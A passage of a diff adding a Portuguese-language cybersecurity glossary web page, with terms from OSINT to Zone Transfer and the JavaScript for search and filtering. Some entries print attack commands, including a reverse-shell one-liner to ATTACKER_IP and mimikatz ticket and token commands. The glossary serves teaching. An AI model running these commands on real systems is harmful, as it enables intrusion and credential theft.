+  { term: "OSINT (Open Source Intelligence)", tag: "pentest", def: "Coleta e análise de informações publicamente disponíveis (redes sociais, DNS, WHOIS, documentos públicos, Shodan, Censys) para levantamento de alvos sem interação direta. Base da fase de Reconnaissance." },
+  { term: "OWASP Top 10", tag: "web", def: "Lista das 10 vulnerabilidades mais críticas em aplicações web, publicada pela Open Web Application Security Project. Atualizada periodicamente, serve como guia de priorização em pentests web e desenvolvimento seguro." },
+
+  // P
+  { term: "Pass-the-Hash (PtH)", tag: "pentest", def: "Técnica de autenticação que usa o hash NTLM de uma senha diretamente, sem precisar conhecê-la em texto claro. Funciona em protocolos que aceitam hashes para autenticação. Ferramenta: <span class='cmd'>mimikatz</span>, <span class='cmd'>CrackMapExec</span>." },
+  { term: "Pass-the-Ticket (PtT)", tag: "pentest", def: "Variante do PtH no contexto Kerberos: o atacante injeta tickets TGT ou TGS roubados para impersonar usuários. Tickets podem ser extraídos com <span class='cmd'>mimikatz sekurlsa::tickets</span> e reutilizados com <span class='cmd'>kerberos::ptt</span>." },
+  { term: "Patch Management", tag: "defense", def: "Processo sistemático de identificar, testar e aplicar patches de segurança em sistemas e softwares. É a principal defesa contra exploração de vulnerabilidades conhecidas. Atrasos no patching são a causa mais comum de brechas em ambientes corporativos." },
+  { term: "Payload", tag: "pentest", def: "Código executado no sistema-alvo após exploração bem-sucedida. Pode ser um <span class='highlight'>bind/reverse shell</span>, <span class='highlight'>Meterpreter</span>, <span class='highlight'>beacon Cobalt Strike</span> ou qualquer código com ação específica. No Metasploit, dividido em singles, stagers e stages." },
+  { term: "Penetration Testing", tag: "pentest", def: "Avaliação de segurança autorizada que simula ataques reais para identificar vulnerabilidades exploráveis em sistemas, redes ou aplicações. Diferente de vulnerability assessment — o pentest valida a exploração. Metodologias: PTES, OWASP, OSSTMM." },
+  { term: "Persistence", tag: "pentest", def: "Técnicas usadas por atacantes para manter acesso a sistemas comprometidos mesmo após reinicializações, mudança de credenciais ou outras ações de remediação. Incluem tarefas agendadas, serviços, chaves de run no registro, cronjobs e DLL hijacking." },
+  { term: "Phishing", tag: "social", def: "Ataque de engenharia social via e-mail (ou outros canais) que engana vítimas para revelar credenciais, clicar em links maliciosos ou baixar malware. Variantes: <span class='highlight'>Spear Phishing</span> (direcionado), <span class='highlight'>Whaling</span> (C-level), <span class='highlight'>Vishing</span> (voz), <span class='highlight'>Smishing</span> (SMS)." },
+  { term: "Pivoting", tag: "pentest", def: "Técnica de usar um sistema comprometido como trampolim para acessar segmentos de rede não diretamente acessíveis ao atacante. Implementado via port forwarding SSH, SOCKS proxies ou módulos de pivoting do Metasploit/Cobalt Strike." },
+  { term: "PKI (Public Key Infrastructure)", tag: "crypto", def: "Conjunto de políticas, processos e tecnologias para gerenciar certificados digitais e pares de chaves. Base da comunicação HTTPS, assinatura de código e autenticação mútua. Componentes: CA, RA, CRL, OCSP." },
+  { term: "Port Scanning", tag: "pentest", def: "Técnica de mapeamento de portas abertas em um host para identificar serviços em execução. Tipos: TCP SYN scan (<span class='cmd'>-sS</span>), TCP Connect (<span class='cmd'>-sT</span>), UDP (<span class='cmd'>-sU</span>). O stealth scan (<span class='cmd'>-sS</span>) não completa o handshake para dificultar detecção." },
+  { term: "Post-Exploitation", tag: "pentest", def: "Fase após comprometimento bem-sucedido onde o atacante executa objetivos: escalação de privilégios, movimentação lateral, exfiltração, persistência. A qualidade do acesso obtido determina o impacto demonstrável ao cliente." },
+  { term: "Privilege Escalation", tag: "pentest", def: "Técnicas para obter permissões além das concedidas inicialmente. <span class='highlight'>Vertical</span>: usuário comum → admin/root. <span class='highlight'>Horizontal</span>: acesso a recursos de outro usuário do mesmo nível. Vetores: SUID/SGID, sudo misconfigurations, kernel exploits, token impersonation." },
+
+  // R
+  { term: "Rainbow Table", tag: "crypto", def: "Estrutura de dados pré-computada que mapeia hashes para senhas em texto claro, otimizando o processo de cracking. Efetivo contra hashes sem salt. Mitigado com bcrypt, scrypt ou Argon2 (funções com salt e custo computacional elevado)." },
+  { term: "Ransomware", tag: "malware", def: "Malware que cifra arquivos da vítima e exige pagamento (geralmente em criptomoeda) pela chave de decriptação. Modelos atuais usam <span class='highlight'>double extortion</span> (criptografia + ameaça de vazamento). Grupos notórios: LockBit, BlackCat, Cl0p." },
+  { term: "RCE (Remote Code Execution)", tag: "pentest", def: "Vulnerabilidade crítica que permite a um atacante executar código arbitrário em um sistema remoto sem autenticação prévia. Classificada como CVSS 10.0 em muitos casos. É o objetivo primário em pentests de aplicações e infraestrutura." },
+  { term: "Reconnaissance", tag: "pentest", def: "Primeira fase do Kill Chain: coleta de informações sobre o alvo. Dividida em <span class='highlight'>passiva</span> (OSINT, sem contato direto) e <span class='highlight'>ativa</span> (varreduras, fingerprinting). Quanto mais informação, mais eficiente o ataque." },
+  { term: "Red Team", tag: "pentest", def: "Equipe que simula adversários reais em exercícios de segurança avançados, testando não só sistemas mas também processos, pessoas e controles de detecção. Mais abrangente que pentest convencional — inclui engenharia social, acesso físico e evasão de defesas." },
+  { term: "Reverse Engineering", tag: "forensics", def: "Análise de sistemas, software ou hardware para entender seu funcionamento sem acesso ao código-fonte. Em malware analysis, envolve disassembly e decompilação de binários. Ferramentas: <span class='cmd'>Ghidra</span>, <span class='cmd'>IDA Pro</span>, <span class='cmd'>x64dbg</span>." },
+  { term: "Reverse Shell", tag: "pentest", def: "Shell onde a máquina comprometida inicia a conexão de volta ao atacante, contornando firewalls que bloqueiam conexões de entrada. Payload clássico: <span class='cmd'>bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1</span>." },
+  { term: "Rootkit", tag: "malware", def: "Malware que modifica o kernel ou componentes fundamentais do sistema para ocultar sua presença e a de outros malwares. Opera em nível privilegiado, dificultando extremamente sua detecção e remoção. Tipos: kernel-level, bootkit, hypervisor." },
+
+  // S
+  { term: "Salt (Criptografia)", tag: "crypto", def: "Valor aleatório adicionado à senha antes do hashing para garantir que senhas iguais gerem hashes diferentes, tornando rainbow tables ineficazes. Deve ser único por usuário e armazenado junto ao hash." },
+  { term: "Sandbox", tag: "defense", def: "Ambiente isolado e monitorado para execução segura de código suspeito. Analisa comportamento de malware sem risco ao sistema host. Serviços: <span class='highlight'>ANY.RUN</span>, <span class='highlight'>Cuckoo Sandbox</span>, <span class='highlight'>VirusTotal</span>." },
+  { term: "SIEM (Security Information and Event Management)", tag: "defense", def: "Plataforma que agrega, correlaciona e analisa logs de múltiplas fontes para detecção de ameaças em tempo real. Combina SIM (gestão de informações) e SEM (gestão de eventos). Produtos: Splunk, IBM QRadar, Microsoft Sentinel, Elastic SIEM." },
+  { term: "Silver Ticket", tag: "pentest", def: "Variante do Golden Ticket que forja tickets Kerberos TGS (service tickets) usando o hash da conta de serviço. Mais difícil de detectar que o Golden Ticket pois não interage com o KDC. Scope limitado ao serviço específico." },
+  { term: "Social Engineering", tag: "social", def: "Manipulação psicológica de pessoas para obter informações confidenciais ou induzi-las a executar ações que comprometam a segurança. Explora vulnerabilidades humanas (confiança, medo, urgência) em vez de técnicas. Base do phishing, vishing e pretexting." },
+  { term: "SQL Injection (SQLi)", tag: "web", def: "Vulnerabilidade onde input malicioso modifica queries SQL da aplicação. Tipos: <span class='highlight'>classic</span> (in-band), <span class='highlight'>blind boolean/time-based</span> e <span class='highlight'>out-of-band</span>. Pode levar a dump completo do banco, bypass de auth ou RCE. Ferramenta: <span class='cmd'>sqlmap</span>." },
+  { term: "SSRF (Server-Side Request Forgery)", tag: "web", def: "Vulnerabilidade que permite ao atacante fazer o servidor executar requisições HTTP para destinos arbitrários — incluindo recursos internos inacessíveis diretamente. Pode expor metadados de cloud (AWS IMDSv1), serviços internos e facilitar SSRF-to-RCE." },
+  { term: "Steganography", tag: "crypto", def: "Técnica de ocultar informações dentro de outros arquivos (imagens, áudio, texto) de forma imperceptível. Usada para exfiltração de dados covert e comunicação C2. Difere da criptografia: esconde a existência da mensagem, não apenas seu conteúdo." },
+  { term: "STRIDE", tag: "defense", def: "Framework de threat modeling da Microsoft com seis categorias de ameaça: <span class='highlight'>S</span>poofing, <span class='highlight'>T</span>ampering, <span class='highlight'>R</span>epudiation, <span class='highlight'>I</span>nformation Disclosure, <span class='highlight'>D</span>enial of Service, <span class='highlight'>E</span>levation of Privilege." },
+  { term: "Subdomain Takeover", tag: "web", def: "Vulnerabilidade onde um subdomínio aponta para um serviço externo (Heroku, GitHub Pages, S3) que foi deletado, permitindo ao atacante reivindicá-lo. Pode ser usado para phishing, cookie hijacking e bypass de CSP." },
+
+  // T
+  { term: "Threat Intelligence (TI)", tag: "defense", def: "Conhecimento baseado em evidências sobre ameaças existentes ou emergentes — atores, TTPs, IoCs. Dividida em <span class='highlight'>estratégica</span> (tendências), <span class='highlight'>tática</span> (TTPs) e <span class='highlight'>operacional/técnica</span> (IoCs específicos). Fonte: MISP, OpenCTI, feeds ISAC." },
+  { term: "Threat Modeling", tag: "defense", def: "Processo estruturado de identificação e priorização de ameaças a um sistema, analisando ativos, adversários, superfícies de ataque e controles existentes. Frameworks: STRIDE, PASTA, LINDDUN, Attack Tree." },
+  { term: "Token Impersonation", tag: "pentest", def: "Técnica no Windows que permite a um processo com privilégios usar o token de segurança de outro processo para executar ações como aquele usuário. Explorada após obtenção de acesso elevado. Implementada via <span class='cmd'>mimikatz token::elevate</span> ou módulos Metasploit." },
+  { term: "TTP (Tactics, Techniques and Procedures)", tag: "defense", def: "Vocabulário padronizado para descrever o comportamento de adversários: <span class='highlight'>Táticas</span> (objetivo de alto nível), <span class='highlight'>Técnicas</span> (como atingir o objetivo), <span class='highlight'>Procedimentos</span> (implementação específica). Base do MITRE ATT&CK." },
+
+  // V
+  { term: "Vulnerability Assessment", tag: "pentest", def: "Processo de identificação e classificação de vulnerabilidades em sistemas sem necessariamente explorá-las. Mais amplo e menos invasivo que pentest. Ferramentas: <span class='cmd'>Nessus</span>, <span class='cmd'>OpenVAS</span>, <span class='cmd'>Qualys</span>." },
+  { term: "VPN (Virtual Private Network)", tag: "network", def: "Tecnologia que cria um túnel criptografado entre dois pontos sobre uma rede pública. Em segurança ofensiva, atacantes usam VPNs para anonimizar origem e estabelecer infra C2. Em defesa, segmenta acesso remoto corporativo." },
+
+  // W
+  { term: "WAF (Web Application Firewall)", tag: "defense", def: "Dispositivo de segurança que filtra, monitora e bloqueia tráfego HTTP malicioso direcionado a aplicações web. Protege contra SQLi, XSS, CSRF e outros ataques OWASP. Em pentests, é comum testar técnicas de bypass de WAF." },
+  { term: "Web Shell", tag: "web", def: "Script malicioso (PHP, ASP, JSP) enviado a um servidor web para fornecer acesso remoto e execução de comandos via interface HTTP. Frequentemente resultado de unrestricted file upload ou RCE. Exemplos: <span class='cmd'>c99.php</span>, <span class='cmd'>p0wny-shell</span>." },
+  { term: "Whaling", tag: "social", def: "Variante altamente direcionada de phishing que mira executivos de alto nível (CEO, CFO, CISO). Mensagens são elaboradamente personalizadas e frequentemente simulam comunicação de parceiros de negócios, advogados ou autoridades regulatórias." },
+  { term: "WPA2/WPA3 Cracking", tag: "network", def: "Ataque a redes Wi-Fi protegidas capturando o handshake 4-way e tentando crackear a chave offline. WPA2-Personal é vulnerável a dictionary attacks. WPA3 introduz SAE (Dragonfly), resistente a offline cracking, mas vulnerável a <span class='highlight'>Dragonblood</span>." },
+
+  // X
+  { term: "XSS (Cross-Site Scripting)", tag: "web", def: "Injeção de scripts maliciosos em páginas web visualizadas por outros usuários. <span class='highlight'>Reflected</span>: script na URL; <span class='highlight'>Stored</span>: persistido no servidor; <span class='highlight'>DOM-based</span>: manipulação do DOM client-side. Permite roubo de cookies, keylogging e defacement." },
+  { term: "XXE (XML External Entity)", tag: "web", def: "Vulnerabilidade em parsers XML que permite injeção de entidades externas. Pode levar a SSRF, leitura de arquivos do servidor (<span class='cmd'>/etc/passwd</span>), DoS via billion laughs attack e em alguns casos RCE." },
+
+  // Z
+  { term: "Zero-Day (0-day)", tag: "pentest", def: "Vulnerabilidade desconhecida pelo fabricante ou para a qual não existe patch disponível. É explorada antes de qualquer defesa possível. Altamente valorizada em mercados cinzas e negros; também usada em operações de Estado (APTs)." },
+  { term: "Zero Trust", tag: "defense", def: "Paradigma de segurança baseado no princípio 'nunca confie, sempre verifique'. Elimina o conceito de rede interna confiável — toda requisição de acesso é autenticada, autorizada e continuamente validada, independentemente da origem." },
+  { term: "Zone Transfer (AXFR)", tag: "pentest", def: "Mecanismo DNS para replicação de zonas entre servidores. Quando mal configurado, qualquer cliente pode solicitar todos os registros DNS de um domínio via <span class='cmd'>dig axfr @ns1.target.com target.com</span>, revelando toda a infraestrutura." },
+];
+
+// Sort terms alphabetically
+terms.sort((a, b) => a.term.localeCompare(b.term));
+
+let currentFilter = 'all';
+let searchQuery = '';
+
+function getTagLabel(tag) {
+  const labels = { pentest:'Pentest', network:'Redes', web:'Web', malware:'Malware', crypto:'Criptografia', social:'Eng. Social', defense:'Defesa', forensics:'Forense' };
+  return labels[tag] || tag;
+}
+
+function buildLetterIndex(visibleTerms) {
+  const letters = {};
+  visibleTerms.forEach(t => {
+    const l = t.term[0].toUpperCase();
+    letters[l] = (letters[l] || 0) + 1;
+  });
+  const idx = document.getElementById('letterIndex');
+  idx.innerHTML = Object.entries(letters).sort().map(([l, c]) => `
+    <div class="letter-group">
+      <a class="letter-link" onclick="scrollToLetter('${l}')">${l} <span class="count">${c}</span></a>
+    </div>
+  `).join('');
+}
+
+function highlightText(text, query) {
+  if (!query) return text;
+  const re = new RegExp(`(${query.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')})`, 'gi');
+  return text.replace(re, '<mark>$1</mark>');
+}
+
+function renderGlossary() {
+  const filtered = terms.filter(t => {
+    const matchFilter = currentFilter === 'all' || t.tag === currentFilter;
+    const q = searchQuery.toLowerCase();
+    const matchSearch = !q || t.term.toLowerCase().includes(q) || t.def.toLowerCase().includes(q);
+    return matchFilter && matchSearch;
+  });
+
+  document.getElementById('visible-count').textContent = filtered.length;
+  document.getElementById('total-count').textContent = terms.length;
+
+  const searchCountEl = document.getElementById('searchCount');
+  if (searchQuery) {
+    searchCountEl.textContent = `${filtered.length} resultado${filtered.length !== 1 ? 's' : ''}`;
+  } else {
+    searchCountEl.textContent = '';
+  }
+
+  const content = document.getElementById('glossaryContent');
+
+  if (filtered.length === 0) {
+    content.innerHTML = `<div class="empty-state"><div class="code">∅</div><p>Nenhum termo encontrado para "<span style="color:var(--green)">${searchQuery}</span>"</p></div>`;
+    buildLetterIndex([]);
+    return;
+  }
+
+  const byLetter = {};
+  filtered.forEach(t => {
+    const l = t.term[0].toUpperCase();
+    if (!byLetter[l]) byLetter[l] = [];
+    byLetter[l].push(t);
+  });
+
+  content.innerHTML = Object.entries(byLetter).sort().map(([letter, ts]) => `
+    <div class="letter-section" id="letter-${letter}">
+      <div class="letter-header">
+        <span class="letter-char">${letter}</span>
+        <div class="letter-line"></div>
+      </div>
+      ${ts.map((t, i) => `
+        <div class="term-card" id="card-${t.term.replace(/\s+/g,'-').replace(/[()\/]/g,'')}" onclick="toggleCard(this)">
+          <div class="term-header">
+            <span class="term-name">${highlightText(t.term, searchQuery)}</span>
+            <span class="term-tag tag-${t.tag}">${getTagLabel(t.tag)}</span>
+            <span class="term-toggle">▶</span>
+          </div>
+          <div class="term-body">
+            <div class="term-def">${t.def}</div>
+          </div>
+        </div>
+      `).join('')}
+    </div>
+  `).join('');
+
+  buildLetterIndex(filtered);
+}
+
+function toggleCard(card) {
+  card.classList.toggle('expanded');
+}
+
+function scrollToLetter(l) {
+  const el = document.getElementById(`letter-${l}`);
+  if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
+}
+
+document.getElementById('searchInput').addEventListener('input', function() {
+  searchQuery = this.value.trim();
+  renderGlossary();
+});
+
+document.getElementById('filterBar').addEventListener('click', function(e) {
+  const btn = e.target.closest('.filter-btn');
+  if (!btn) return;
+  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  currentFilter = btn.dataset.filter;
+  renderGlossary();
+});
+
+renderGlossary();
+</script>
+</body>
+</html>
